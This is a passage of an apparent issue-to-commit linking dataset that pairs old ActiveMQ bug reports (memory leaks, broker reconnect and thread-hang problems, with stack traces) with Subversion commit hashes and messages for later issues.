    <property name=""url"">
      <!-- Use a URL like 'jdbc:hsqldb:hsql://localhost:9001' if you want to connect to a remote hsqldb -->
      <value>jdbc:derby:derbydb;create=true</value>
    </property>
    <property name=""username"">
      <value></value>
    </property>
    <property name=""password"">
      <value></value>
    </property>
    <property name=""poolPreparedStatements"">
      <value>true</value>
    </property>
  </bean>
</beans>

2. Run the attached unit test case, stopping & starting the external broker as requested in the log4j output to the console.  This unit test will wait for start/stop, but you'll have to trigger that manually.  I did not wish to try a fully automated test case because that did not represent the use-case we are trying to achieve.

",a0b9aec6e95c566c22e04e8874f9729ec4490819,"test case for https://issues.apache.org/activemq/browse/AMQ-2305 - seems to work fine

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@788429 13f79535-47bb-0310-9956-ffa450edef68"
12481017,AMQ-227,"ActiveMQ clients that ActiveMQ have the same client id, that is ""clientid"". This makes ActiveMQ complain about it.
Client is only using queues.
",fbddf4f8683a0c246899b290ad9269c42367188d,"resolve https://issues.apache.org/activemq/browse/AMQ-2274 - add simple Boolean PropertyEditor implementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@783281 13f79535-47bb-0310-9956-ffa450edef68"
12481120,AMQ-224,"Hi everyone, 

I need your input related to this problem. I am using the latest ActiveMQ 2.1 with JDK 1.5. I have two networked-broker with network channels, let's say A, B. If I shutdown broker B, the network channel on both ends re-connected. But i noticed that the topic publisher in B is no longer able to publish message to A. On the other hand, topic subscriber is able to receive the message published by A. If I shutdown A, the situation is reversed. 

I like to confirm whether this finding is valid. I appreciate you input. 

Thanks 

",01e2aec7b59cf5def1c69a6c2208c7648b6956d2,"resolve https://issues.apache.org/activemq/browse/AMQ-2241 - ensure default session is created for a duplicate connection request

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@771718 13f79535-47bb-0310-9956-ffa450edef68"
12481120,AMQ-224,"Hi everyone, 

I need your input related to this problem. I am using the latest ActiveMQ 2.1 with JDK 1.5. I have two networked-broker with network channels, let's say A, B. If I shutdown broker B, the network channel on both ends re-connected. But i noticed that the topic publisher in B is no longer able to publish message to A. On the other hand, topic subscriber is able to receive the message published by A. If I shutdown A, the situation is reversed. 

I like to confirm whether this finding is valid. I appreciate you input. 

Thanks 

",9383c6d697658f6ac7902e621124649b510b6bb3,"resolve alternative path to https://issues.apache.org/activemq/browse/AMQ-2241 via ra where connection is reused. state tracker was not notified when remove command is suppressed and simulated during transport outage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@774712 13f79535-47bb-0310-9956-ffa450edef68"
12481120,AMQ-224,"Hi everyone, 

I need your input related to this problem. I am using the latest ActiveMQ 2.1 with JDK 1.5. I have two networked-broker with network channels, let's say A, B. If I shutdown broker B, the network channel on both ends re-connected. But i noticed that the topic publisher in B is no longer able to publish message to A. On the other hand, topic subscriber is able to receive the message published by A. If I shutdown A, the situation is reversed. 

I like to confirm whether this finding is valid. I appreciate you input. 

Thanks 

",eae5aa09d1237cd299f555ade4256d989be7497b,"Fix for https://issues.apache.org/activemq/browse/AMQ-2249

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813053 13f79535-47bb-0310-9956-ffa450edef68"
12481059,AMQ-223,"We are having OutOfMemoryErrors in the broker.  Its configured for vmPersistence, messages have 60 second TTL.  I have checked Queues using Hermes (what a bitch that is to setup with ActiveMQ) and they are empty as expected.  We are using RPC style messaging, with TemporaryQueues for responses, if that helps at all.

The broker can run for a week before running out of memory, but it is related to how many connections are made.  We run 2-3 batch processes each morning that create a few thousand Connections.  Our broker continually grows, even when all consumers and producers are shutdown.

Profiling with YourKit shows the 63% of the broker memory (after GC) is held by 3292 instances of TcpTransportChannel, held by TcpTransportServerChannel.  Note, as mentioned above there are no active connections, so this doesn't appear to be a bug in our code.

This is possibly related to AMQ-125 (fixed 1.2), and AMQ-222.  It seems to be the same problem as mentioned by Charles Anthony ""Possible Memory Leak ?"" on activemq-user.  I could not find any update on that thread.

We will workaround this, by holding connections in a ThreadLocal, since there are only a few threads in a few daily processes.  But regardless, we can expect this growth to continue albeit a much slower pace.",245771a14d81dda10a64a70406ea40cac7433f36,"test case for https://issues.apache.org/activemq/browse/AMQ-2233 with prefetch  workaround

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@773862 13f79535-47bb-0310-9956-ffa450edef68"
12481059,AMQ-223,"We are having OutOfMemoryErrors in the broker.  Its configured for vmPersistence, messages have 60 second TTL.  I have checked Queues using Hermes (what a bitch that is to setup with ActiveMQ) and they are empty as expected.  We are using RPC style messaging, with TemporaryQueues for responses, if that helps at all.

The broker can run for a week before running out of memory, but it is related to how many connections are made.  We run 2-3 batch processes each morning that create a few thousand Connections.  Our broker continually grows, even when all consumers and producers are shutdown.

Profiling with YourKit shows the 63% of the broker memory (after GC) is held by 3292 instances of TcpTransportChannel, held by TcpTransportServerChannel.  Note, as mentioned above there are no active connections, so this doesn't appear to be a bug in our code.

This is possibly related to AMQ-125 (fixed 1.2), and AMQ-222.  It seems to be the same problem as mentioned by Charles Anthony ""Possible Memory Leak ?"" on activemq-user.  I could not find any update on that thread.

We will workaround this, by holding connections in a ThreadLocal, since there are only a few threads in a few daily processes.  But regardless, we can expect this growth to continue albeit a much slower pace.",558ff7802d797d2c63c9efa12f179de080d8910d,"additional test for https://issues.apache.org/activemq/browse/AMQ-2233, broker in 5.2, works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@775064 13f79535-47bb-0310-9956-ffa450edef68"
12481059,AMQ-223,"We are having OutOfMemoryErrors in the broker.  Its configured for vmPersistence, messages have 60 second TTL.  I have checked Queues using Hermes (what a bitch that is to setup with ActiveMQ) and they are empty as expected.  We are using RPC style messaging, with TemporaryQueues for responses, if that helps at all.

The broker can run for a week before running out of memory, but it is related to how many connections are made.  We run 2-3 batch processes each morning that create a few thousand Connections.  Our broker continually grows, even when all consumers and producers are shutdown.

Profiling with YourKit shows the 63% of the broker memory (after GC) is held by 3292 instances of TcpTransportChannel, held by TcpTransportServerChannel.  Note, as mentioned above there are no active connections, so this doesn't appear to be a bug in our code.

This is possibly related to AMQ-125 (fixed 1.2), and AMQ-222.  It seems to be the same problem as mentioned by Charles Anthony ""Possible Memory Leak ?"" on activemq-user.  I could not find any update on that thread.

We will workaround this, by holding connections in a ThreadLocal, since there are only a few threads in a few daily processes.  But regardless, we can expect this growth to continue albeit a much slower pace.",a039a0e99763d2018678c6fee0f37a49462bff33,"additional improvement for https://issues.apache.org/activemq/browse/AMQ-2238 - include commons-codec in lib/optional

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@797007 13f79535-47bb-0310-9956-ffa450edef68"
12481059,AMQ-223,"We are having OutOfMemoryErrors in the broker.  Its configured for vmPersistence, messages have 60 second TTL.  I have checked Queues using Hermes (what a bitch that is to setup with ActiveMQ) and they are empty as expected.  We are using RPC style messaging, with TemporaryQueues for responses, if that helps at all.

The broker can run for a week before running out of memory, but it is related to how many connections are made.  We run 2-3 batch processes each morning that create a few thousand Connections.  Our broker continually grows, even when all consumers and producers are shutdown.

Profiling with YourKit shows the 63% of the broker memory (after GC) is held by 3292 instances of TcpTransportChannel, held by TcpTransportServerChannel.  Note, as mentioned above there are no active connections, so this doesn't appear to be a bug in our code.

This is possibly related to AMQ-125 (fixed 1.2), and AMQ-222.  It seems to be the same problem as mentioned by Charles Anthony ""Possible Memory Leak ?"" on activemq-user.  I could not find any update on that thread.

We will workaround this, by holding connections in a ThreadLocal, since there are only a few threads in a few daily processes.  But regardless, we can expect this growth to continue albeit a much slower pace.",d4133c4de88f5ad382bb8e736275997362f26a98,"https://issues.apache.org/activemq/browse/AMQ-2239 - stomp+nio transport implementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813703 13f79535-47bb-0310-9956-ffa450edef68"
12481059,AMQ-223,"We are having OutOfMemoryErrors in the broker.  Its configured for vmPersistence, messages have 60 second TTL.  I have checked Queues using Hermes (what a bitch that is to setup with ActiveMQ) and they are empty as expected.  We are using RPC style messaging, with TemporaryQueues for responses, if that helps at all.

The broker can run for a week before running out of memory, but it is related to how many connections are made.  We run 2-3 batch processes each morning that create a few thousand Connections.  Our broker continually grows, even when all consumers and producers are shutdown.

Profiling with YourKit shows the 63% of the broker memory (after GC) is held by 3292 instances of TcpTransportChannel, held by TcpTransportServerChannel.  Note, as mentioned above there are no active connections, so this doesn't appear to be a bug in our code.

This is possibly related to AMQ-125 (fixed 1.2), and AMQ-222.  It seems to be the same problem as mentioned by Charles Anthony ""Possible Memory Leak ?"" on activemq-user.  I could not find any update on that thread.

We will workaround this, by holding connections in a ThreadLocal, since there are only a few threads in a few daily processes.  But regardless, we can expect this growth to continue albeit a much slower pace.",164826a421ed0d3f0715082fa4ecea1bd8942cd0,"Fix for https://issues.apache.org/activemq/browse/AMQ-2231

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@905967 13f79535-47bb-0310-9956-ffa450edef68"
12481081,AMQ-221,"In the method NetworkChannel.removeConsumerInfo(ConsumerInfo info) the following test must evaluate TRUE for in ordre for a NetworkMessageBridge to be stopped.

if (currefcnt <= 0 && !bridge.isDurableTopic() &&
 (bridge.getDestination().isTopic() || bridge.getDestination().isTemporary()))

I do not think this test is correct.  If a consumer creates a subscription on a queue, an then disconnects, the above expression evaluates false and the NetworkMessageBridge is left open.  I put out a log statement showing the values tested for the closure of a queue subscriber:

 RefCnt=0 isDurableTopic=false isTopic=false isTemp=false

I do not understand the last condition of the above test.  Why only stop the bridge if the destation is a Topic or Temporary Queue?  Why would it not be appropriate to stop the bridge a non-temporary queue when the subscriber is gone.  It seems contrary to the documentation that indicates messages are only transfered between brokers when a subcriber is attached. I think this is the reason that it appears that messages go missing.  The messages are not missing, they just end up on a broker that has not subscriber to receive them.  If you start up the subcriber process again, the missing messages reapear.  
",9f0c86cc6d347ada5c6678f4d877cb04a3af2300,"commit test case with policy maxPageSize workaround in place that demonstrates it works as expected - https://issues.apache.org/activemq/browse/AMQ-2217

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995381 13f79535-47bb-0310-9956-ffa450edef68"
12481062,AMQ-220,"Please update JCAContainer to use ListableBeanFactory.getBeanNamesForType(Class) rather than blindly trying to instantiate every single bean in the context.

http://svn.activemq.org/trunk/activemq/modules/container/src/java/org/activemq/jca/JCAContainer.java?rev=1&view=auto


    [junit] Error creating bean with name 'abstractInboxCommand': Bean definition is abstract
    [junit] org.springframework.beans.factory.BeanIsAbstractException: Error creating bean with name
 'abstractInboxCommand': Bean definition is abstract
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.checkMergedBeanDefinition(AbstractBeanFactory.java:653)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:145)
    [junit]     at org.codehaus.activemq.jca.JCAContainer.afterPropertiesSet(JCAContainer.java:77)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1065)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:343)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:260)",144a362aeebdd11a8144c704d3ee0414cbb70a84,"test case for https://issues.apache.org/activemq/browse/AMQ-2203 - start=false

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@983027 13f79535-47bb-0310-9956-ffa450edef68"
12481062,AMQ-220,"Please update JCAContainer to use ListableBeanFactory.getBeanNamesForType(Class) rather than blindly trying to instantiate every single bean in the context.

http://svn.activemq.org/trunk/activemq/modules/container/src/java/org/activemq/jca/JCAContainer.java?rev=1&view=auto


    [junit] Error creating bean with name 'abstractInboxCommand': Bean definition is abstract
    [junit] org.springframework.beans.factory.BeanIsAbstractException: Error creating bean with name
 'abstractInboxCommand': Bean definition is abstract
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.checkMergedBeanDefinition(AbstractBeanFactory.java:653)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:145)
    [junit]     at org.codehaus.activemq.jca.JCAContainer.afterPropertiesSet(JCAContainer.java:77)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1065)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:343)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:260)",34dcc17aa3ea1643e99d37098a08c30e1eaf94ec,"test case for https://issues.apache.org/activemq/browse/AMQ-2203 - start=false

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@983035 13f79535-47bb-0310-9956-ffa450edef68"
12481062,AMQ-220,"Please update JCAContainer to use ListableBeanFactory.getBeanNamesForType(Class) rather than blindly trying to instantiate every single bean in the context.

http://svn.activemq.org/trunk/activemq/modules/container/src/java/org/activemq/jca/JCAContainer.java?rev=1&view=auto


    [junit] Error creating bean with name 'abstractInboxCommand': Bean definition is abstract
    [junit] org.springframework.beans.factory.BeanIsAbstractException: Error creating bean with name
 'abstractInboxCommand': Bean definition is abstract
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.checkMergedBeanDefinition(AbstractBeanFactory.java:653)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)
    [junit]     at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:145)
    [junit]     at org.codehaus.activemq.jca.JCAContainer.afterPropertiesSet(JCAContainer.java:77)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1065)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:343)
    [junit]     at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:260)",6c82480a108a0776632d44b5fa9a1d2e1d8a8501,"test for: https://issues.apache.org/jira/browse/AMQ-2200

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1185792 13f79535-47bb-0310-9956-ffa450edef68"
12481023,AMQ-219,"Reported by: Cobus Combrink (ccombrink@astratagroup.com)

The implementation of class DataContainer maintains a list of classes with
embedded OPEN file handles and runs the risk of exhausting the system file
handles.

This can be made visible by running a fast producer and a very slow
consumer.
An exception will be thrown after a large number of messages were queued
using the class SpooledBoundedActiveMQMessageQueue.
The server will be unable to queue further messages, subsequently dropping
connections.",206df1bd5741424e3eadd4fcbb38411547a85379,"test case for https://issues.apache.org/activemq/browse/AMQ-2195

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@772931 13f79535-47bb-0310-9956-ffa450edef68"
12481254,AMQ-214,"Our 

        protected Class resolveClass(ObjectStreamClass v) throws ClassNotFoundException{
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            try {
                if (cl != null){
                    return cl.loadClass(v.getName());
                } else {
                    return Class.forName(v.getName());
                }
            } catch ( ClassNotFoundException e ) {
                return ACTIVEMQ_CLASSLOADER.loadClass(v.getName());
            }
        }

The Serilaization helper class does not handle loading class arrays.  The class name will be something like ""[java.lang.String"" but cl.loadClass does not handle classes in that format.",0061f6f75538ede8fe3443925e64beb839abfb90,"https://issues.apache.org/jira/browse/AMQ-4000 - tracking subscription commands causes a problem with replay outside of activate - can reset a sub ack locations - regression in AMQ2149Test. Fixed by ignoring sub add during recovery replay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511306 13f79535-47bb-0310-9956-ffa450edef68"
12481191,AMQ-213,"The TransportStatusEvent.toString() sometimes prints null for the connection information.  This happens when the remoteURI was provided to the event rather than a TransportChannel object.  The following replacement method will print a better message in these cases.

public String toString() {
    return ""Channel: "" + (transportChannel == null ? remoteURI.toString() : transportChannel.toString()) + "" has "" + getStatusAsString(channelStatus);
}
",f4aa952a098fa2b9f41d674a65f19f712b6cef30,"Initial cut of AMQ-2131 for using camel-web to interact with camel endpoints and routes while inside the AMQ broker

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@746279 13f79535-47bb-0310-9956-ffa450edef68"
12481144,AMQ-211,"I found a problem with the use of the Reliable protocol.  If you list multiple servers and the connection to the initial fails, the reconnect process will not complete properly.  This is cause because of the firing order of status events.  In the TcpTransportChannel.doClose() method the call to onAsyncException() will cause the Reliable class to fire a status event for disconnected, then after establishing the connection to the next server it will fire a status event for reconnected.  Finally after control returns to the doClose() method another status event for disconnected is fired.  All of these events are received by the ActiveMQConnection.statusChanged() method and are interpreted to set the ActiveMQConnection.isTransportOK member.  With the series of events as listed above:

disconnected
reconnected
disconnected

you can see why the state of ActiveMQConnection.isTransportOK is incorrect after a reconnect.

I did not know if it were safe to actually remove the final fireStatusEvent() call from the TcpTransportChannel.doClose(), so did the next best thing.  I moved it up before the the call to onAsyncException() .  This changed the order of the events to:

disconnected
disconnected
reconnected

This fixed my problem, but I am not sure it is the proper fix.
",9797077d6a7780f464878e6709391677deca4d9a,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-2113

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@777805 13f79535-47bb-0310-9956-ffa450edef68"
12481098,AMQ-210,"Steps to reproduce:

2 instances of tomcat 5.0.30, jdk 1.4.2, call it tomcat1 and tomcat2
Each instance is running a webapp with the following config: brokerURL=""peer://someService"", embeddedBroker=(true or false, the behaviour is the same with either setting )

Kill tomcat1:    tomcat2's webapp detects the disconnect and successfully removes the client.
Restart tomcat1: tomcat2's webapp DOES NOT detect the reconnect of tomcat1's webapp or any other peer but continues to hear its own messages. In activemq2.0 it's unable to hear even its own messages.  

When there are at least 3 peers in a cluster this does not occur and peers seem to detect membership changes correctly.

If I am using the peer protocol incorrectly I would greatly appreciate if you let me know. All I am trying to have is 
a network of peers, each with an embedded broker to achieve transparent failover. Thanks a lot.

Igor Kaplansky",9a6074387637d18154dffb3017f7bf396aa7b237,"test for AMQ-2100

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@743027 13f79535-47bb-0310-9956-ffa450edef68"
12481098,AMQ-210,"Steps to reproduce:

2 instances of tomcat 5.0.30, jdk 1.4.2, call it tomcat1 and tomcat2
Each instance is running a webapp with the following config: brokerURL=""peer://someService"", embeddedBroker=(true or false, the behaviour is the same with either setting )

Kill tomcat1:    tomcat2's webapp detects the disconnect and successfully removes the client.
Restart tomcat1: tomcat2's webapp DOES NOT detect the reconnect of tomcat1's webapp or any other peer but continues to hear its own messages. In activemq2.0 it's unable to hear even its own messages.  

When there are at least 3 peers in a cluster this does not occur and peers seem to detect membership changes correctly.

If I am using the peer protocol incorrectly I would greatly appreciate if you let me know. All I am trying to have is 
a network of peers, each with an embedded broker to achieve transparent failover. Thanks a lot.

Igor Kaplansky",63b4de13e6a0b986f0592d953f744a42f5bccfea,"https://issues.apache.org/activemq/browse/AMQ-2105 - inital work on creating packages with unix-maven-plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@929601 13f79535-47bb-0310-9956-ffa450edef68"
12481030,AMQ-209,"Hello,

Use the configuration activemq.xml and jndi.properties attached in the test.zip file.

Compile the sources (package protojms).

Start the IMEISubscriber.
Start the IMEIPublisher.
Kill the IMEISubscriber then kill the IMEIPublisher.
Restart the IMEISubscriber: you will see that some of the persistent message have not been received by this durable subscriber !

Bug in activeMQ or in my program ? 

I have tested this within JORAM : no pb!


I have other questions:
   1) For persistence performance what is recommended ? (BerkeleyDB, ....)
   2) In order to use BerkeleyDB what are the optional jars that I have to put in the 
      classpath ?
   3) Using Joram it is not manadatory to set the clientID, I have read the spec but nothing 
      has been said regarding this API. Could you give me some explanations regarding this 
      API ?
",59643ef23ecf1e0a59fbc4d798b84a8a4457d429,"fix for https://issues.apache.org/activemq/browse/AMQ-2092

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@739950 13f79535-47bb-0310-9956-ffa450edef68"
12481030,AMQ-209,"Hello,

Use the configuration activemq.xml and jndi.properties attached in the test.zip file.

Compile the sources (package protojms).

Start the IMEISubscriber.
Start the IMEIPublisher.
Kill the IMEISubscriber then kill the IMEIPublisher.
Restart the IMEISubscriber: you will see that some of the persistent message have not been received by this durable subscriber !

Bug in activeMQ or in my program ? 

I have tested this within JORAM : no pb!


I have other questions:
   1) For persistence performance what is recommended ? (BerkeleyDB, ....)
   2) In order to use BerkeleyDB what are the optional jars that I have to put in the 
      classpath ?
   3) Using Joram it is not manadatory to set the clientID, I have read the spec but nothing 
      has been said regarding this API. Could you give me some explanations regarding this 
      API ?
",479acad417aa06a28d90abc0baf6a32f203d4f43,"fix for https://issues.apache.org/activemq/browse/AMQ-2096

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@744082 13f79535-47bb-0310-9956-ffa450edef68"
12481030,AMQ-209,"Hello,

Use the configuration activemq.xml and jndi.properties attached in the test.zip file.

Compile the sources (package protojms).

Start the IMEISubscriber.
Start the IMEIPublisher.
Kill the IMEISubscriber then kill the IMEIPublisher.
Restart the IMEISubscriber: you will see that some of the persistent message have not been received by this durable subscriber !

Bug in activeMQ or in my program ? 

I have tested this within JORAM : no pb!


I have other questions:
   1) For persistence performance what is recommended ? (BerkeleyDB, ....)
   2) In order to use BerkeleyDB what are the optional jars that I have to put in the 
      classpath ?
   3) Using Joram it is not manadatory to set the clientID, I have read the spec but nothing 
      has been said regarding this API. Could you give me some explanations regarding this 
      API ?
",69946d98059bf419449a886ca37629e007d79e49,"fix for https://issues.apache.org/activemq/browse/AMQ-2097 - missing jar dependency for activemq-xmpp

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@760045 13f79535-47bb-0310-9956-ffa450edef68"
12481232,AMQ-208,"When running an embedded broker in a Java app which acts as a message producer, I see (via JMX console for the whole app) that some activeMQ broker-related threads, dedicated to handling a TcpTransportChannel, remain alive whereas no client is connected to the broker.

As shown by the stack trace for these threads (see below) it seems that, after the remote client has disconnected, the thread is waiting to be notified by another object so that it can terminate. This issue does not happen every time a client disconnects.

Here is the waiting thread stack trace :

Name: Thread-11
State: WAITING on EDU.oswego.cs.dl.util.concurrent.PooledExecutor@f03c46
Total blocked: 162  Total waited: 10 152

Stack trace: 
java.lang.Object.wait(Native Method)
java.lang.Object.wait(Object.java:474)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
org.codehaus.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
org.codehaus.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:472)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:196)
org.codehaus.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:658)
org.codehaus.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:134)
org.codehaus.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:430)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:438)
org.codehaus.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:233)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
java.lang.Thread.run(Thread.java:595)

",9dec1b18ba07a83f6d3d8f12f99710477f5e47ae,"test for https://issues.apache.org/activemq/browse/AMQ-2080 that shows use of reconnectDelay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@737703 13f79535-47bb-0310-9956-ffa450edef68"
12481232,AMQ-208,"When running an embedded broker in a Java app which acts as a message producer, I see (via JMX console for the whole app) that some activeMQ broker-related threads, dedicated to handling a TcpTransportChannel, remain alive whereas no client is connected to the broker.

As shown by the stack trace for these threads (see below) it seems that, after the remote client has disconnected, the thread is waiting to be notified by another object so that it can terminate. This issue does not happen every time a client disconnects.

Here is the waiting thread stack trace :

Name: Thread-11
State: WAITING on EDU.oswego.cs.dl.util.concurrent.PooledExecutor@f03c46
Total blocked: 162  Total waited: 10 152

Stack trace: 
java.lang.Object.wait(Native Method)
java.lang.Object.wait(Object.java:474)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
org.codehaus.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
org.codehaus.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:472)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:196)
org.codehaus.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:658)
org.codehaus.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:134)
org.codehaus.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:430)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:438)
org.codehaus.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:233)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
java.lang.Thread.run(Thread.java:595)

",39dd6b914a6954bf8f7114e97831482fd616e8bb,"fix for https://issues.apache.org/activemq/browse/AMQ-2086

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@738052 13f79535-47bb-0310-9956-ffa450edef68"
12481232,AMQ-208,"When running an embedded broker in a Java app which acts as a message producer, I see (via JMX console for the whole app) that some activeMQ broker-related threads, dedicated to handling a TcpTransportChannel, remain alive whereas no client is connected to the broker.

As shown by the stack trace for these threads (see below) it seems that, after the remote client has disconnected, the thread is waiting to be notified by another object so that it can terminate. This issue does not happen every time a client disconnects.

Here is the waiting thread stack trace :

Name: Thread-11
State: WAITING on EDU.oswego.cs.dl.util.concurrent.PooledExecutor@f03c46
Total blocked: 162  Total waited: 10 152

Stack trace: 
java.lang.Object.wait(Native Method)
java.lang.Object.wait(Object.java:474)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
org.codehaus.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
org.codehaus.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:472)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:196)
org.codehaus.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:658)
org.codehaus.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:134)
org.codehaus.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:430)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:438)
org.codehaus.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:233)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
java.lang.Thread.run(Thread.java:595)

",06da208e163f1fb6da2f4204bac57756b15b4b28,"test case for https://issues.apache.org/activemq/browse/AMQ-2087

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@738566 13f79535-47bb-0310-9956-ffa450edef68"
12481232,AMQ-208,"When running an embedded broker in a Java app which acts as a message producer, I see (via JMX console for the whole app) that some activeMQ broker-related threads, dedicated to handling a TcpTransportChannel, remain alive whereas no client is connected to the broker.

As shown by the stack trace for these threads (see below) it seems that, after the remote client has disconnected, the thread is waiting to be notified by another object so that it can terminate. This issue does not happen every time a client disconnects.

Here is the waiting thread stack trace :

Name: Thread-11
State: WAITING on EDU.oswego.cs.dl.util.concurrent.PooledExecutor@f03c46
Total blocked: 162  Total waited: 10 152

Stack trace: 
java.lang.Object.wait(Native Method)
java.lang.Object.wait(Object.java:474)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
org.codehaus.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
org.codehaus.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:472)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:196)
org.codehaus.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:658)
org.codehaus.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:134)
org.codehaus.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:430)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:438)
org.codehaus.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:233)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
java.lang.Thread.run(Thread.java:595)

",60d6c36ff2aeb23f3ca91f7b4cb135f665a776dd,"additional fix for https://issues.apache.org/activemq/browse/AMQ-2088

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@742888 13f79535-47bb-0310-9956-ffa450edef68"
12481232,AMQ-208,"When running an embedded broker in a Java app which acts as a message producer, I see (via JMX console for the whole app) that some activeMQ broker-related threads, dedicated to handling a TcpTransportChannel, remain alive whereas no client is connected to the broker.

As shown by the stack trace for these threads (see below) it seems that, after the remote client has disconnected, the thread is waiting to be notified by another object so that it can terminate. This issue does not happen every time a client disconnects.

Here is the waiting thread stack trace :

Name: Thread-11
State: WAITING on EDU.oswego.cs.dl.util.concurrent.PooledExecutor@f03c46
